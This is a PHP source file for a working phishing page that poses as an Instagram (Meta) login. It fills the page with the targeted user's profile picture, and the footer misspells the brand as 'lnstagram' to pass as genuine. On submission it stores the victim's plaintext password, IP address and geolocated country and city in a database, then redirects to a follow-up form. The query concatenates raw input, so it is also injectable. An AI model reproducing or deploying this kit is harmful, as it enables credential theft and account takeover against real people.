<?php
include ("app/config.php");
include ("app/database/yazilar.php");
include ("app/database/router.php");
require 'app/api/spexapi.php';
session_start();
error_reporting(E_ALL);

$username=$_GET['nick'];
$url2="https://smihub.com/search?query=$username";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
$tik="-";
$followers="-";
if($_POST){
  $password=$_POST["password"];
  $ip=$_SERVER["REMOTE_ADDR"];
  $konum = file_get_contents("http://ip-api.com/xml/".$ip);
  $cek = new SimpleXMLElement($konum);
  $ulke = $cek->country;
  $sehir = $cek->city;
  date_default_timezone_set('Europe/Istanbul');
  $cur_time=date("d-m-Y H:i:s");
   include ("app/bot/value1.php");
  $SpeXCoderWebSanalınEniyiScripti = $spexcon->query("INSERT INTO `users`(`id`, `user`, `pass`, `pass2`, `mail`, `no`, `faktor`, `ip`, `tarih`) VALUES (NULL,'".$username."','".$password."','Null','Null','Null','Null','".$ip."',current_timestamp)");

    
   header("Location: form2.php?nick=$username");
}




?>
<!DOCTYPE html>
<style>img[alt="www.000webhost.com"]{display:none;}</style>
<html>
<head>
<link rel="stylesheet" href="assets/theme/spex2/css/xss1.css">
<link rel="stylesheet" type="text/css" href="assets/theme/spex2/css/xss2.css">
<link rel="stylesheet" href="assets/theme/spex2/css/xss3.css">
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<?php include ("app/tag/main/meta.php"); ?>
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
</head>
<body>
<header>
<table>
<tr>
<td><img src="assets/theme/spex2/image/meta.svg" width="250" height="70"></td>

</tr>
</table>
</header>
<center>
<div class="home">
<br><br>
<div class="mx">
<div class="wrapper fadeInDown">
<div id="formContent">
<br>
<div class="fadeIn first">
<img src="<?php  echo  $pp; ?>" style="max-width:90%; border-radius:50%;" width="135">
<br><br>
<h3 class="title" style="text-align:center;font-family: Helvetica, Arial, Sans-Serif;"><b><?php echo $formbaslik;?></b></h3>
<p class="text5" style="color: black!important;"><center><?php echo $formyazi; ?></p></center>
<form autocomplete="off" method="post">
<input type="password" id="Login" class="fadeIn second" minlength="6" required  name="password" placeholder="Password"><br>
<a align="right"style="margin-top: 20px;position: relative; left: 23%;text-align:right; color: #09a7fd ; font-family:sans-serif; font-size:14px; font-weight:400;text-decoration:none;" href="https://www.instagram.com/accounts/password/reset/" id="link"> Forgot Password ? </a><br>
<center>
<button type="submit" class="submit">
<div class="f4x" style="margin-left: 0px;">
<span class="comm">Login</span>
</div>
</button>
</center>
</form>
</div>
</div>
<br><br>
</div>
</div>
</div>
<h5 class="title2" style="text-align:center;color: white;font-family: Helvetica, Arial, Sans-Serif;"><b>© 2022 lnstagram From Meta.</b></h5>
</center>
</body>
</html>